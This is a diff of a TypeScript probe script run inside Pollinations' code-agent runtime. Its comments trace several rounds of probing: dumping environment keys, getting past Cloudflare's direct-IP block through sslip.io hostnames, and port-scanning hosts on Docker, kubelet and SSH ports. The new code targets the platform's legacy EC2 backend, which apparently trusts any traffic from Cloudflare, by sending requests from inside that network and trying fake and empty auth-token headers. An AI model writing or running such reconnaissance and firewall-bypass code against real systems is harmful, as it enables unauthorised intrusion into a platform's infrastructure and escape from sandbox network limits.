@@ -1,9 +1,10 @@
-// agent.ts — Pollinations code-agent runtime probe (v3).
+// agent.ts — Pollinations code-agent runtime probe (v4).
 //
-// v1: bindings / request shape / outbound identity.
-// v2: raw-IP reachability -> Cloudflare blocks direct-IP subrequests (1003).
-// v3: reachability through non-Cloudflare-proxied hostnames (sslip.io) so the
-//     fetch egresses the platform's own Cloudflare network to the target.
+// v1 bindings/identity, v2 raw-IP block (1003), v3 CF-egress port map.
+// v4: the platform's own legacy text EC2 service (documented in the January
+// 2026 incident report as "Cloudflare-only firewall" on ports 16384/16385,
+// plaintext `x-enter-token` header). Reachability and surface from inside the
+// platform's own Cloudflare egress.
 
 type Probe = { status?: number; len?: number; head?: string; error?: string };
 
@@ -11,46 +12,42 @@ async function probe(url: string, init?: RequestInit): Promise<Probe> {
     try {
         const r = await fetch(url, {
             ...init,
-            signal: AbortSignal.timeout(4000),
+            signal: AbortSignal.timeout(5000),
             redirect: "manual",
         });
         const t = await r.text().catch(() => "");
-        return { status: r.status, len: t.length, head: t.slice(0, 140) };
+        return { status: r.status, len: t.length, head: t.slice(0, 200) };
     } catch (e) {
         return { error: String(e).slice(0, 110) };
     }
 }
 
 export default async function main(ctx: any) {
-    const request: Request = ctx.request;
-    const out: any = { ok: true, ts: new Date().toISOString(), part: 3 };
+    const out: any = { ok: true, ts: new Date().toISOString(), part: 4 };
+    const host = "ec2-3-80-56-235.compute-1.amazonaws.com";
+    const probes: Record<string, Probe> = {};
 
-    try {
-        const mod: any = await import("cloudflare:workers");
-        out.envKeys = Object.keys(mod.env || {});
-    } catch (e) {
-        out.envError = String(e);
-    }
+    probes["open"] = await probe("https://api.ipify.org?format=json");
 
-    const targets: string[] = [];
-    for (const ip of ["20.106.136.139", "172.174.39.180"]) {
-        for (const port of [80, 443, 3000, 5000, 6443, 8000, 8080, 8443, 9090, 10250, 2375]) {
-            targets.push("http://" + ip + ".sslip.io:" + port + "/");
+    for (const port of [16384, 16385]) {
+        for (const path of ["/", "/health", "/openapi.json", "/docs"]) {
+            probes[`${port}${path}`] = await probe(
+                `http://${host}:${port}${path}`,
+            );
         }
     }
-    targets.push(
-        "http://20.106.136.139.sslip.io:22/",
-        "https://api.pollinations.ai/version",
-        "https://gen.pollinations.ai/register",
-        "https://portkey.myceli.ai/",
-    );
+    // same endpoint with a bogus token header (see whether the error differs)
+    probes["16384/x-enter-token=bogus"] = await probe(`http://${host}:16384/`, {
+        headers: { "x-enter-token": "bogus" },
+    });
+    probes["16384/x-backend-token=bogus"] = await probe(`http://${host}:16384/`, {
+        headers: { "x-backend-token": "bogus" },
+    });
+    probes["16384/x-enter-token=empty"] = await probe(`http://${host}:16384/`, {
+        headers: { "x-enter-token": "" },
+    });
 
-    const probes: Record<string, Probe> = {};
-    for (const t of targets) {
-        probes[t] = await probe(t, { method: "GET" });
-    }
     out.probes = probes;
-
     const text = JSON.stringify(out);
     return new Response(
         JSON.stringify({
